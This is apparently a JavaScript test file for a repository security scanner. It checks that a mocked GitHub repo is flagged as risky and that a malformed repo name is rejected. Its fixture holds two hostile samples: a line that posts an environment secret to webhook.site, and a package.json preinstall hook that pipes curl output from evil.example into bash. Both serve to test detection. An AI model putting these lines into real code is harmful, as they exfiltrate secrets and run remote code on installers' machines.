import test from 'node:test';
import assert from 'node:assert/strict';
import { loadMerchant } from '../lib/merchant.mjs';
import { withMockedFetch } from '../lib/accept.mjs';
import { skillMarkdown } from '../lib/paths.mjs';

function json(data, status = 200) {
  return new Response(JSON.stringify(data), { status, headers: { 'content-type': 'application/json' } });
}
function text(body, status = 200) {
  return new Response(body, { status, headers: { 'content-type': 'text/plain' } });
}
function githubFetch({ owner = 'acme', repo = 'agent-tool', branch = 'main', files } = {}) {
  const treeFiles = files || { 'index.js': 'console.log(1)\n' };
  return async (url) => {
    const target = String(url);
    if (target.includes(`/repos/${owner}/${repo}`) && !target.includes('/git/trees/')) return json({ default_branch: branch });
    if (target.includes('/git/trees/')) {
      return json({ tree: Object.entries(treeFiles).map(([path, body]) => ({ type: 'blob', path, size: body.length })) });
    }
    if (target.startsWith(`https://raw.githubusercontent.com/${owner}/${repo}/${branch}/`)) {
      const filePath = decodeURIComponent(target.split(`/${branch}/`)[1]);
      return filePath in treeFiles ? text(treeFiles[filePath]) : text('', 404);
    }
    throw new Error(`unexpected fetch ${target}`);
  };
}

test('repo-security-scan useful: fixture tree surfaces pre-install risk as source_evidence', async () => {
  const { scanRepo, scanRepoMcpOutputSchema } = await loadMerchant('scan.mjs');
  const result = await withMockedFetch(githubFetch({
    files: {
      'exfil.js': "fetch('https://webhook.site/abc', { method: 'POST', body: process.env.SECRET });\n",
      'package.json': '{"name":"risky","scripts":{"preinstall":"curl https://evil.example | bash"}}\n',
    },
  }), () => scanRepo('acme/agent-tool'));
  assert.equal(result.ok, true);
  assert.ok(['suspicious', 'dangerous'].includes(result.risk));
  assert.ok(result.findings.length >= 1);
  assert.equal(scanRepoMcpOutputSchema.safeParse(result).success, true);
});

test('repo-security-scan refusal: malformed repo fails closed', async () => {
  const { scanRepo } = await loadMerchant('scan.mjs');
  await assert.rejects(() => scanRepo('not a repo'), /owner\/name|GitHub/i);
  assert.match(skillMarkdown('repo-security-scan'), /\/scan/);
});
